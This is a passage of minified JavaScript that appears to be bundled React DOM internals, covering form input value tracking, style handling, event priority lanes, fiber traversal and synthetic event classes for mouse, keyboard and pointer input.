                        }
                    }), Object.defineProperty(e, t, {
                        enumerable: n.enumerable
                    }), {
                        getValue: function() {
                            return r
                        },
                        setValue: function(s) {
                            r = "" + s
                        },
                        stopTracking: function() {
                            e._valueTracker = null, delete e[t]
                        }
                    }
                }
            }

            function Yl(e) {
                e._valueTracker || (e._valueTracker = p_(e))
            }

            function R1(e) {
                if (!e) return !1;
                var t = e._valueTracker;
                if (!t) return !0;
                var n = t.getValue(),
                    r = "";
                return e && (r = P1(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
            }

            function jc(e) {
                if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
                try {
                    return e.activeElement || e.body
                } catch {
                    return e.body
                }
            }

            function Eh(e, t) {
                var n = t.checked;
                return Fe({}, t, {
                    defaultChecked: void 0,
                    defaultValue: void 0,
                    value: void 0,
                    checked: n ?? e._wrapperState.initialChecked
                })
            }

            function Pg(e, t) {
                var n = t.defaultValue == null ? "" : t.defaultValue,
                    r = t.checked != null ? t.checked : t.defaultChecked;
                n = ni(t.value != null ? t.value : n), e._wrapperState = {
                    initialChecked: r,
                    initialValue: n,
                    controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
                }
            }

            function N1(e, t) {
                t = t.checked, t != null && fm(e, "checked", t, !1)
            }

            function Ah(e, t) {
                N1(e, t);
                var n = ni(t.value),
                    r = t.type;
                if (n != null) r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
                else if (r === "submit" || r === "reset") {
                    e.removeAttribute("value");
                    return
                }
                t.hasOwnProperty("value") ? _h(e, t.type, n) : t.hasOwnProperty("defaultValue") && _h(e, t.type, ni(t.defaultValue)), t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
            }

            function Rg(e, t, n) {
                if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
                    var r = t.type;
                    if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null)) return;
                    t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
                }
                n = e.name, n !== "" && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, n !== "" && (e.name = n)
            }

            function _h(e, t, n) {
                (t !== "number" || jc(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
            }
            var la = Array.isArray;

            function Wo(e, t, n, r) {
                if (e = e.options, t) {
                    t = {};
                    for (var i = 0; i < n.length; i++) t["$" + n[i]] = !0;
                    for (n = 0; n < e.length; n++) i = t.hasOwnProperty("$" + e[n].value), e[n].selected !== i && (e[n].selected = i), i && r && (e[n].defaultSelected = !0)
                } else {
                    for (n = "" + ni(n), t = null, i = 0; i < e.length; i++) {
                        if (e[i].value === n) {
                            e[i].selected = !0, r && (e[i].defaultSelected = !0);
                            return
                        }
                        t !== null || e[i].disabled || (t = e[i])
                    }
                    t !== null && (t.selected = !0)
                }
            }

            function Sh(e, t) {
                if (t.dangerouslySetInnerHTML != null) throw Error(H(91));
                return Fe({}, t, {
                    value: void 0,
                    defaultValue: void 0,
                    children: "" + e._wrapperState.initialValue
                })
            }

            function Ng(e, t) {
                var n = t.value;
                if (n == null) {
                    if (n = t.children, t = t.defaultValue, n != null) {
                        if (t != null) throw Error(H(92));
                        if (la(n)) {
                            if (1 < n.length) throw Error(H(93));
                            n = n[0]
                        }
                        t = n
                    }
                    t == null && (t = ""), n = t
                }
                e._wrapperState = {
                    initialValue: ni(n)
                }
            }

            function B1(e, t) {
                var n = ni(t.value),
                    r = ni(t.defaultValue);
                n != null && (n = "" + n, n !== e.value && (e.value = n), t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)), r != null && (e.defaultValue = "" + r)
            }

            function Bg(e) {
                var t = e.textContent;
                t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t)
            }

            function M1(e) {
                switch (e) {
                    case "svg":
                        return "http://www.w3.org/2000/svg";
                    case "math":
                        return "http://www.w3.org/1998/Math/MathML";
                    default:
                        return "http://www.w3.org/1999/xhtml"
                }
            }

            function kh(e, t) {
                return e == null || e === "http://www.w3.org/1999/xhtml" ? M1(t) : e === "http://www.w3.org/2000/svg" && t === "foreignObject" ? "http://www.w3.org/1999/xhtml" : e
            }
            var Jl, O1 = function(e) {
                return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function(t, n, r, i) {
                    MSApp.execUnsafeLocalFunction(function() {
                        return e(t, n, r, i)
                    })
                } : e
            }(function(e, t) {
                if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e) e.innerHTML = t;
                else {
                    for (Jl = Jl || document.createElement("div"), Jl.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = Jl.firstChild; e.firstChild;) e.removeChild(e.firstChild);
                    for (; t.firstChild;) e.appendChild(t.firstChild)
                }
            });

            function Oa(e, t) {
                if (t) {
                    var n = e.firstChild;
                    if (n && n === e.lastChild && n.nodeType === 3) {
                        n.nodeValue = t;
                        return
                    }
                }
                e.textContent = t
            }
            var ya = {
                    animationIterationCount: !0,
                    aspectRatio: !0,
                    borderImageOutset: !0,
                    borderImageSlice: !0,
                    borderImageWidth: !0,
                    boxFlex: !0,
                    boxFlexGroup: !0,
                    boxOrdinalGroup: !0,
                    columnCount: !0,
                    columns: !0,
                    flex: !0,
                    flexGrow: !0,
                    flexPositive: !0,
                    flexShrink: !0,
                    flexNegative: !0,
                    flexOrder: !0,
                    gridArea: !0,
                    gridRow: !0,
                    gridRowEnd: !0,
                    gridRowSpan: !0,
                    gridRowStart: !0,
                    gridColumn: !0,
                    gridColumnEnd: !0,
                    gridColumnSpan: !0,
                    gridColumnStart: !0,
                    fontWeight: !0,
                    lineClamp: !0,
                    lineHeight: !0,
                    opacity: !0,
                    order: !0,
                    orphans: !0,
                    tabSize: !0,
                    widows: !0,
                    zIndex: !0,
                    zoom: !0,
                    fillOpacity: !0,
                    floodOpacity: !0,
                    stopOpacity: !0,
                    strokeDasharray: !0,
                    strokeDashoffset: !0,
                    strokeMiterlimit: !0,
                    strokeOpacity: !0,
                    strokeWidth: !0
                },
                m_ = ["Webkit", "ms", "Moz", "O"];
            Object.keys(ya).forEach(function(e) {
                m_.forEach(function(t) {
                    t = t + e.charAt(0).toUpperCase() + e.substring(1), ya[t] = ya[e]
                })
            });

            function L1(e, t, n) {
                return t == null || typeof t == "boolean" || t === "" ? "" : n || typeof t != "number" || t === 0 || ya.hasOwnProperty(e) && ya[e] ? ("" + t).trim() : t + "px"
            }

            function F1(e, t) {
                e = e.style;
                for (var n in t)
                    if (t.hasOwnProperty(n)) {
                        var r = n.indexOf("--") === 0,
                            i = L1(n, t[n], r);
                        n === "float" && (n = "cssFloat"), r ? e.setProperty(n, i) : e[n] = i
                    }
            }
            var g_ = Fe({
                menuitem: !0
            }, {
                area: !0,
                base: !0,
                br: !0,
                col: !0,
                embed: !0,
                hr: !0,
                img: !0,
                input: !0,
                keygen: !0,
                link: !0,
                meta: !0,
                param: !0,
                source: !0,
                track: !0,
                wbr: !0
            });

            function Th(e, t) {
                if (t) {
                    if (g_[e] && (t.children != null || t.dangerouslySetInnerHTML != null)) throw Error(H(137, e));
                    if (t.dangerouslySetInnerHTML != null) {
                        if (t.children != null) throw Error(H(60));
                        if (typeof t.dangerouslySetInnerHTML != "object" || !("__html" in t.dangerouslySetInnerHTML)) throw Error(H(61))
                    }
                    if (t.style != null && typeof t.style != "object") throw Error(H(62))
                }
            }

            function Ih(e, t) {
                if (e.indexOf("-") === -1) return typeof t.is == "string";
                switch (e) {
                    case "annotation-xml":
                    case "color-profile":
                    case "font-face":
                    case "font-face-src":
                    case "font-face-uri":
                    case "font-face-format":
                    case "font-face-name":
                    case "missing-glyph":
                        return !1;
                    default:
                        return !0
                }
            }
            var Ch = null;

            function gm(e) {
                return e = e.target || e.srcElement || window, e.correspondingUseElement && (e = e.correspondingUseElement), e.nodeType === 3 ? e.parentNode : e
            }
            var Ph = null,
                qo = null,
                Qo = null;

            function Mg(e) {
                if (e = Rl(e)) {
                    if (typeof Ph != "function") throw Error(H(280));
                    var t = e.stateNode;
                    t && (t = vd(t), Ph(e.stateNode, e.type, t))
                }
            }

            function D1(e) {
                qo ? Qo ? Qo.push(e) : Qo = [e] : qo = e
            }

            function j1() {
                if (qo) {
                    var e = qo,
                        t = Qo;
                    if (Qo = qo = null, Mg(e), t)
                        for (e = 0; e < t.length; e++) Mg(t[e])
                }
            }

            function H1(e, t) {
                return e(t)
            }

            function $1() {}
            var yf = !1;

            function U1(e, t, n) {
                if (yf) return e(t, n);
                yf = !0;
                try {
                    return H1(e, t, n)
                } finally {
                    yf = !1, (qo !== null || Qo !== null) && ($1(), j1())
                }
            }

            function La(e, t) {
                var n = e.stateNode;
                if (n === null) return null;
                var r = vd(n);
                if (r === null) return null;
                n = r[t];
                e: switch (t) {
                    case "onClick":
                    case "onClickCapture":
                    case "onDoubleClick":
                    case "onDoubleClickCapture":
                    case "onMouseDown":
                    case "onMouseDownCapture":
                    case "onMouseMove":
                    case "onMouseMoveCapture":
                    case "onMouseUp":
                    case "onMouseUpCapture":
                    case "onMouseEnter":
                        (r = !r.disabled) || (e = e.type, r = !(e === "button" || e === "input" || e === "select" || e === "textarea")), e = !r;
                        break e;
                    default:
                        e = !1
                }
                if (e) return null;
                if (n && typeof n != "function") throw Error(H(231, t, typeof n));
                return n
            }
            var Rh = !1;
            if (yr) try {
                var Qs = {};
                Object.defineProperty(Qs, "passive", {
                    get: function() {
                        Rh = !0
                    }
                }), window.addEventListener("test", Qs, Qs), window.removeEventListener("test", Qs, Qs)
            } catch {
                Rh = !1
            }

            function v_(e, t, n, r, i, o, s, a, l) {
                var u = Array.prototype.slice.call(arguments, 3);
                try {
                    t.apply(n, u)
                } catch (c) {
                    this.onError(c)
                }
            }
            var wa = !1,
                Hc = null,
                $c = !1,
                Nh = null,
                y_ = {
                    onError: function(e) {
                        wa = !0, Hc = e
                    }
                };

            function w_(e, t, n, r, i, o, s, a, l) {
                wa = !1, Hc = null, v_.apply(y_, arguments)
            }

            function b_(e, t, n, r, i, o, s, a, l) {
                if (w_.apply(this, arguments), wa) {
                    if (wa) {
                        var u = Hc;
                        wa = !1, Hc = null
                    } else throw Error(H(198));
                    $c || ($c = !0, Nh = u)
                }
            }

            function go(e) {
                var t = e,
                    n = e;
                if (e.alternate)
                    for (; t.return;) t = t.return;
                else {
                    e = t;
                    do t = e, t.flags & 4098 && (n = t.return), e = t.return; while (e)
                }
                return t.tag === 3 ? n : null
            }

            function z1(e) {
                if (e.tag === 13) {
                    var t = e.memoizedState;
                    if (t === null && (e = e.alternate, e !== null && (t = e.memoizedState)), t !== null) return t.dehydrated
                }
                return null
            }

            function Og(e) {
                if (go(e) !== e) throw Error(H(188))
            }

            function x_(e) {
                var t = e.alternate;
                if (!t) {
                    if (t = go(e), t === null) throw Error(H(188));
                    return t !== e ? null : e
                }
                for (var n = e, r = t;;) {
                    var i = n.return;
                    if (i === null) break;
                    var o = i.alternate;
                    if (o === null) {
                        if (r = i.return, r !== null) {
                            n = r;
                            continue
                        }
                        break
                    }
                    if (i.child === o.child) {
                        for (o = i.child; o;) {
                            if (o === n) return Og(i), e;
                            if (o === r) return Og(i), t;
                            o = o.sibling
                        }
                        throw Error(H(188))
                    }
                    if (n.return !== r.return) n = i, r = o;
                    else {
                        for (var s = !1, a = i.child; a;) {
                            if (a === n) {
                                s = !0, n = i, r = o;
                                break
                            }
                            if (a === r) {
                                s = !0, r = i, n = o;
                                break
                            }
                            a = a.sibling
                        }
                        if (!s) {
                            for (a = o.child; a;) {
                                if (a === n) {
                                    s = !0, n = o, r = i;
                                    break
                                }
                                if (a === r) {
                                    s = !0, r = o, n = i;
                                    break
                                }
                                a = a.sibling
                            }
                            if (!s) throw Error(H(189))
                        }
                    }
                    if (n.alternate !== r) throw Error(H(190))
                }
                if (n.tag !== 3) throw Error(H(188));
                return n.stateNode.current === n ? e : t
            }

            function G1(e) {
                return e = x_(e), e !== null ? V1(e) : null
            }

            function V1(e) {
                if (e.tag === 5 || e.tag === 6) return e;
                for (e = e.child; e !== null;) {
                    var t = V1(e);
                    if (t !== null) return t;
                    e = e.sibling
                }
                return null
            }
            var W1 = Kt.unstable_scheduleCallback,
                Lg = Kt.unstable_cancelCallback,
                E_ = Kt.unstable_shouldYield,
                A_ = Kt.unstable_requestPaint,
                $e = Kt.unstable_now,
                __ = Kt.unstable_getCurrentPriorityLevel,
                vm = Kt.unstable_ImmediatePriority,
                q1 = Kt.unstable_UserBlockingPriority,
                Uc = Kt.unstable_NormalPriority,
                S_ = Kt.unstable_LowPriority,
                Q1 = Kt.unstable_IdlePriority,
                hd = null,
                Un = null;

            function k_(e) {
                if (Un && typeof Un.onCommitFiberRoot == "function") try {
                    Un.onCommitFiberRoot(hd, e, void 0, (e.current.flags & 128) === 128)
                } catch {}
            }
            var An = Math.clz32 ? Math.clz32 : C_,
                T_ = Math.log,
                I_ = Math.LN2;

            function C_(e) {
                return e >>>= 0, e === 0 ? 32 : 31 - (T_(e) / I_ | 0) | 0
            }
            var Xl = 64,
                ec = 4194304;

            function ca(e) {
                switch (e & -e) {
                    case 1:
                        return 1;
                    case 2:
                        return 2;
                    case 4:
                        return 4;
                    case 8:
                        return 8;
                    case 16:
                        return 16;
                    case 32:
                        return 32;
                    case 64:
                    case 128:
                    case 256:
                    case 512:
                    case 1024:
                    case 2048:
                    case 4096:
                    case 8192:
                    case 16384:
                    case 32768:
                    case 65536:
                    case 131072:
                    case 262144:
                    case 524288:
                    case 1048576:
                    case 2097152:
                        return e & 4194240;
                    case 4194304:
                    case 8388608:
                    case 16777216:
                    case 33554432:
                    case 67108864:
                        return e & 130023424;
                    case 134217728:
                        return 134217728;
                    case 268435456:
                        return 268435456;
                    case 536870912:
                        return 536870912;
                    case 1073741824:
                        return 1073741824;
                    default:
                        return e
                }
            }

            function zc(e, t) {
                var n = e.pendingLanes;
                if (n === 0) return 0;
                var r = 0,
                    i = e.suspendedLanes,
                    o = e.pingedLanes,
                    s = n & 268435455;
                if (s !== 0) {
                    var a = s & ~i;
                    a !== 0 ? r = ca(a) : (o &= s, o !== 0 && (r = ca(o)))
                } else s = n & ~i, s !== 0 ? r = ca(s) : o !== 0 && (r = ca(o));
                if (r === 0) return 0;
                if (t !== 0 && t !== r && !(t & i) && (i = r & -r, o = t & -t, i >= o || i === 16 && (o & 4194240) !== 0)) return t;
                if (r & 4 && (r |= n & 16), t = e.entangledLanes, t !== 0)
                    for (e = e.entanglements, t &= r; 0 < t;) n = 31 - An(t), i = 1 << n, r |= e[n], t &= ~i;
                return r
            }

            function P_(e, t) {
                switch (e) {
                    case 1:
                    case 2:
                    case 4:
                        return t + 250;
                    case 8:
                    case 16:
                    case 32:
                    case 64:
                    case 128:
                    case 256:
                    case 512:
                    case 1024:
                    case 2048:
                    case 4096:
                    case 8192:
                    case 16384:
                    case 32768:
                    case 65536:
                    case 131072:
                    case 262144:
                    case 524288:
                    case 1048576:
                    case 2097152:
                        return t + 5e3;
                    case 4194304:
                    case 8388608:
                    case 16777216:
                    case 33554432:
                    case 67108864:
                        return -1;
                    case 134217728:
                    case 268435456:
                    case 536870912:
                    case 1073741824:
                        return -1;
                    default:
                        return -1
                }
            }

            function R_(e, t) {
                for (var n = e.suspendedLanes, r = e.pingedLanes, i = e.expirationTimes, o = e.pendingLanes; 0 < o;) {
                    var s = 31 - An(o),
                        a = 1 << s,
                        l = i[s];
                    l === -1 ? (!(a & n) || a & r) && (i[s] = P_(a, t)) : l <= t && (e.expiredLanes |= a), o &= ~a
                }
            }

            function Bh(e) {
                return e = e.pendingLanes & -1073741825, e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
            }

            function K1() {
                var e = Xl;
                return Xl <<= 1, !(Xl & 4194240) && (Xl = 64), e
            }

            function wf(e) {
                for (var t = [], n = 0; 31 > n; n++) t.push(e);
                return t
            }

            function Cl(e, t, n) {
                e.pendingLanes |= t, t !== 536870912 && (e.suspendedLanes = 0, e.pingedLanes = 0), e = e.eventTimes, t = 31 - An(t), e[t] = n
            }

            function N_(e, t) {
                var n = e.pendingLanes & ~t;
                e.pendingLanes = t, e.suspendedLanes = 0, e.pingedLanes = 0, e.expiredLanes &= t, e.mutableReadLanes &= t, e.entangledLanes &= t, t = e.entanglements;
                var r = e.eventTimes;
                for (e = e.expirationTimes; 0 < n;) {
                    var i = 31 - An(n),
                        o = 1 << i;
                    t[i] = 0, r[i] = -1, e[i] = -1, n &= ~o
                }
            }

            function ym(e, t) {
                var n = e.entangledLanes |= t;
                for (e = e.entanglements; n;) {
                    var r = 31 - An(n),
                        i = 1 << r;
                    i & t | e[r] & t && (e[r] |= t), n &= ~i
                }
            }
            var xe = 0;

            function Z1(e) {
                return e &= -e, 1 < e ? 4 < e ? e & 268435455 ? 16 : 536870912 : 4 : 1
            }
            var Y1, wm, J1, X1, ew, Mh = !1,
                tc = [],
                Wr = null,
                qr = null,
                Qr = null,
                Fa = new Map,
                Da = new Map,
                Fr = [],
                B_ = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");

            function Fg(e, t) {
                switch (e) {
                    case "focusin":
                    case "focusout":
                        Wr = null;
                        break;
                    case "dragenter":
                    case "dragleave":
                        qr = null;
                        break;
                    case "mouseover":
                    case "mouseout":
                        Qr = null;
                        break;
                    case "pointerover":
                    case "pointerout":
                        Fa.delete(t.pointerId);
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                        Da.delete(t.pointerId)
                }
            }

            function Ks(e, t, n, r, i, o) {
                return e === null || e.nativeEvent !== o ? (e = {
                    blockedOn: t,
                    domEventName: n,
                    eventSystemFlags: r,
                    nativeEvent: o,
                    targetContainers: [i]
                }, t !== null && (t = Rl(t), t !== null && wm(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, i !== null && t.indexOf(i) === -1 && t.push(i), e)
            }

            function M_(e, t, n, r, i) {
                switch (t) {
                    case "focusin":
                        return Wr = Ks(Wr, e, t, n, r, i), !0;
                    case "dragenter":
                        return qr = Ks(qr, e, t, n, r, i), !0;
                    case "mouseover":
                        return Qr = Ks(Qr, e, t, n, r, i), !0;
                    case "pointerover":
                        var o = i.pointerId;
                        return Fa.set(o, Ks(Fa.get(o) || null, e, t, n, r, i)), !0;
                    case "gotpointercapture":
                        return o = i.pointerId, Da.set(o, Ks(Da.get(o) || null, e, t, n, r, i)), !0
                }
                return !1
            }

            function tw(e) {
                var t = Ci(e.target);
                if (t !== null) {
                    var n = go(t);
                    if (n !== null) {
                        if (t = n.tag, t === 13) {
                            if (t = z1(n), t !== null) {
                                e.blockedOn = t, ew(e.priority, function() {
                                    J1(n)
                                });
                                return
                            }
                        } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                            e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                            return
                        }
                    }
                }
                e.blockedOn = null
            }

            function bc(e) {
                if (e.blockedOn !== null) return !1;
                for (var t = e.targetContainers; 0 < t.length;) {
                    var n = Oh(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
                    if (n === null) {
                        n = e.nativeEvent;
                        var r = new n.constructor(n.type, n);
                        Ch = r, n.target.dispatchEvent(r), Ch = null
                    } else return t = Rl(n), t !== null && wm(t), e.blockedOn = n, !1;
                    t.shift()
                }
                return !0
            }

            function Dg(e, t, n) {
                bc(e) && n.delete(t)
            }

            function O_() {
                Mh = !1, Wr !== null && bc(Wr) && (Wr = null), qr !== null && bc(qr) && (qr = null), Qr !== null && bc(Qr) && (Qr = null), Fa.forEach(Dg), Da.forEach(Dg)
            }

            function Zs(e, t) {
                e.blockedOn === t && (e.blockedOn = null, Mh || (Mh = !0, Kt.unstable_scheduleCallback(Kt.unstable_NormalPriority, O_)))
            }

            function ja(e) {
                function t(i) {
                    return Zs(i, e)
                }
                if (0 < tc.length) {
                    Zs(tc[0], e);
                    for (var n = 1; n < tc.length; n++) {
                        var r = tc[n];
                        r.blockedOn === e && (r.blockedOn = null)
                    }
                }
                for (Wr !== null && Zs(Wr, e), qr !== null && Zs(qr, e), Qr !== null && Zs(Qr, e), Fa.forEach(t), Da.forEach(t), n = 0; n < Fr.length; n++) r = Fr[n], r.blockedOn === e && (r.blockedOn = null);
                for (; 0 < Fr.length && (n = Fr[0], n.blockedOn === null);) tw(n), n.blockedOn === null && Fr.shift()
            }
            var Ko = kr.ReactCurrentBatchConfig,
                Gc = !0;

            function L_(e, t, n, r) {
                var i = xe,
                    o = Ko.transition;
                Ko.transition = null;
                try {
                    xe = 1, bm(e, t, n, r)
                } finally {
                    xe = i, Ko.transition = o
                }
            }

            function F_(e, t, n, r) {
                var i = xe,
                    o = Ko.transition;
                Ko.transition = null;
                try {
                    xe = 4, bm(e, t, n, r)
                } finally {
                    xe = i, Ko.transition = o
                }
            }

            function bm(e, t, n, r) {
                if (Gc) {
                    var i = Oh(e, t, n, r);
                    if (i === null) Cf(e, t, r, Vc, n), Fg(e, r);
                    else if (M_(i, e, t, n, r)) r.stopPropagation();
                    else if (Fg(e, r), t & 4 && -1 < B_.indexOf(e)) {
                        for (; i !== null;) {
                            var o = Rl(i);
                            if (o !== null && Y1(o), o = Oh(e, t, n, r), o === null && Cf(e, t, r, Vc, n), o === i) break;
                            i = o
                        }
                        i !== null && r.stopPropagation()
                    } else Cf(e, t, r, null, n)
                }
            }
            var Vc = null;

            function Oh(e, t, n, r) {
                if (Vc = null, e = gm(r), e = Ci(e), e !== null)
                    if (t = go(e), t === null) e = null;
                    else if (n = t.tag, n === 13) {
                    if (e = z1(t), e !== null) return e;
                    e = null
                } else if (n === 3) {
                    if (t.stateNode.current.memoizedState.isDehydrated) return t.tag === 3 ? t.stateNode.containerInfo : null;
                    e = null
                } else t !== e && (e = null);
                return Vc = e, null
            }

            function nw(e) {
                switch (e) {
                    case "cancel":
                    case "click":
                    case "close":
                    case "contextmenu":
                    case "copy":
                    case "cut":
                    case "auxclick":
                    case "dblclick":
                    case "dragend":
                    case "dragstart":
                    case "drop":
                    case "focusin":
                    case "focusout":
                    case "input":
                    case "invalid":
                    case "keydown":
                    case "keypress":
                    case "keyup":
                    case "mousedown":
                    case "mouseup":
                    case "paste":
                    case "pause":
                    case "play":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointerup":
                    case "ratechange":
                    case "reset":
                    case "resize":
                    case "seeked":
                    case "submit":
                    case "touchcancel":
                    case "touchend":
                    case "touchstart":
                    case "volumechange":
                    case "change":
                    case "selectionchange":
                    case "textInput":
                    case "compositionstart":
                    case "compositionend":
                    case "compositionupdate":
                    case "beforeblur":
                    case "afterblur":
                    case "beforeinput":
                    case "blur":
                    case "fullscreenchange":
                    case "focus":
                    case "hashchange":
                    case "popstate":
                    case "select":
                    case "selectstart":
                        return 1;
                    case "drag":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "mousemove":
                    case "mouseout":
                    case "mouseover":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "scroll":
                    case "toggle":
                    case "touchmove":
                    case "wheel":
                    case "mouseenter":
                    case "mouseleave":
                    case "pointerenter":
                    case "pointerleave":
                        return 4;
                    case "message":
                        switch (__()) {
                            case vm:
                                return 1;
                            case q1:
                                return 4;
                            case Uc:
                            case S_:
                                return 16;
                            case Q1:
                                return 536870912;
                            default:
                                return 16
                        }
                    default:
                        return 16
                }
            }
            var $r = null,
                xm = null,
                xc = null;

            function rw() {
                if (xc) return xc;
                var e, t = xm,
                    n = t.length,
                    r, i = "value" in $r ? $r.value : $r.textContent,
                    o = i.length;
                for (e = 0; e < n && t[e] === i[e]; e++);
                var s = n - e;
                for (r = 1; r <= s && t[n - r] === i[o - r]; r++);
                return xc = i.slice(e, 1 < r ? 1 - r : void 0)
            }

            function Ec(e) {
                var t = e.keyCode;
                return "charCode" in e ? (e = e.charCode, e === 0 && t === 13 && (e = 13)) : e = t, e === 10 && (e = 13), 32 <= e || e === 13 ? e : 0
            }

            function nc() {
                return !0
            }

            function jg() {
                return !1
            }

            function Xt(e) {
                function t(n, r, i, o, s) {
                    this._reactName = n, this._targetInst = i, this.type = r, this.nativeEvent = o, this.target = s, this.currentTarget = null;
                    for (var a in e) e.hasOwnProperty(a) && (n = e[a], this[a] = n ? n(o) : o[a]);
                    return this.isDefaultPrevented = (o.defaultPrevented != null ? o.defaultPrevented : o.returnValue === !1) ? nc : jg, this.isPropagationStopped = jg, this
                }
                return Fe(t.prototype, {
                    preventDefault: function() {
                        this.defaultPrevented = !0;
                        var n = this.nativeEvent;
                        n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1), this.isDefaultPrevented = nc)
                    },
                    stopPropagation: function() {
                        var n = this.nativeEvent;
                        n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0), this.isPropagationStopped = nc)
                    },
                    persist: function() {},
                    isPersistent: nc
                }), t
            }
            var Ns = {
                    eventPhase: 0,
                    bubbles: 0,
                    cancelable: 0,
                    timeStamp: function(e) {
                        return e.timeStamp || Date.now()
                    },
                    defaultPrevented: 0,
                    isTrusted: 0
                },
                Em = Xt(Ns),
                Pl = Fe({}, Ns, {
                    view: 0,
                    detail: 0
                }),
                D_ = Xt(Pl),
                bf, xf, Ys, pd = Fe({}, Pl, {
                    screenX: 0,
                    screenY: 0,
                    clientX: 0,
                    clientY: 0,
                    pageX: 0,
                    pageY: 0,
                    ctrlKey: 0,
                    shiftKey: 0,
                    altKey: 0,
                    metaKey: 0,
                    getModifierState: Am,
                    button: 0,
                    buttons: 0,
                    relatedTarget: function(e) {
                        return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
                    },
                    movementX: function(e) {
                        return "movementX" in e ? e.movementX : (e !== Ys && (Ys && e.type === "mousemove" ? (bf = e.screenX - Ys.screenX, xf = e.screenY - Ys.screenY) : xf = bf = 0, Ys = e), bf)
                    },
                    movementY: function(e) {
                        return "movementY" in e ? e.movementY : xf
                    }
                }),
                Hg = Xt(pd),
                j_ = Fe({}, pd, {
                    dataTransfer: 0
                }),
                H_ = Xt(j_),
                $_ = Fe({}, Pl, {
                    relatedTarget: 0
                }),
                Ef = Xt($_),
                U_ = Fe({}, Ns, {
                    animationName: 0,
                    elapsedTime: 0,
                    pseudoElement: 0
                }),
                z_ = Xt(U_),
                G_ = Fe({}, Ns, {
                    clipboardData: function(e) {
                        return "clipboardData" in e ? e.clipboardData : window.clipboardData
                    }
                }),
                V_ = Xt(G_),
                W_ = Fe({}, Ns, {
                    data: 0
                }),
                $g = Xt(W_),
                q_ = {
                    Esc: "Escape",
                    Spacebar: " ",
                    Left: "ArrowLeft",
                    Up: "ArrowUp",
                    Right: "ArrowRight",
                    Down: "ArrowDown",
                    Del: "Delete",
                    Win: "OS",
                    Menu: "ContextMenu",
                    Apps: "ContextMenu",
                    Scroll: "ScrollLock",
                    MozPrintableKey: "Unidentified"
                },
                Q_ = {
                    8: "Backspace",
                    9: "Tab",
                    12: "Clear",
                    13: "Enter",
                    16: "Shift",
                    17: "Control",
                    18: "Alt",
                    19: "Pause",
                    20: "CapsLock",
                    27: "Escape",
                    32: " ",
                    33: "PageUp",
                    34: "PageDown",
                    35: "End",
                    36: "Home",
                    37: "ArrowLeft",
                    38: "ArrowUp",
                    39: "ArrowRight",
                    40: "ArrowDown",
                    45: "Insert",
                    46: "Delete",
                    112: "F1",
                    113: "F2",
                    114: "F3",
                    115: "F4",
                    116: "F5",
                    117: "F6",
                    118: "F7",
                    119: "F8",
                    120: "F9",
                    121: "F10",
                    122: "F11",
                    123: "F12",
                    144: "NumLock",
                    145: "ScrollLock",
                    224: "Meta"
                },
                K_ = {
                    Alt: "altKey",
                    Control: "ctrlKey",
                    Meta: "metaKey",
                    Shift: "shiftKey"
                };

            function Z_(e) {
                var t = this.nativeEvent;
                return t.getModifierState ? t.getModifierState(e) : (e = K_[e]) ? !!t[e] : !1
            }

            function Am() {
                return Z_
            }
            var Y_ = Fe({}, Pl, {
                    key: function(e) {
                        if (e.key) {
                            var t = q_[e.key] || e.key;
                            if (t !== "Unidentified") return t
                        }
                        return e.type === "keypress" ? (e = Ec(e), e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? Q_[e.keyCode] || "Unidentified" : ""
                    },
                    code: 0,
                    location: 0,
                    ctrlKey: 0,
                    shiftKey: 0,
                    altKey: 0,
                    metaKey: 0,
                    repeat: 0,
                    locale: 0,
                    getModifierState: Am,
                    charCode: function(e) {
                        return e.type === "keypress" ? Ec(e) : 0
                    },
                    keyCode: function(e) {
                        return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
                    },
                    which: function(e) {
                        return e.type === "keypress" ? Ec(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
                    }
                }),
                J_ = Xt(Y_),
                X_ = Fe({}, pd, {
                    pointerId: 0,
                    width: 0,
                    height: 0,
                    pressure: 0,
                    tangentialPressure: 0,
                    tiltX: 0,
                    tiltY: 0,
                    twist: 0,
                    pointerType: 0,
                    isPrimary: 0
                }),
                Ug = Xt(X_),
                eS = Fe({}, Pl, {
                    touches: 0,
                    targetTouches: 0,
                    changedTouches: 0,
                    altKey: 0,
                    metaKey: 0,
                    ctrlKey: 0,
                    shiftKey: 0,
                    getModifierState: Am
                }),
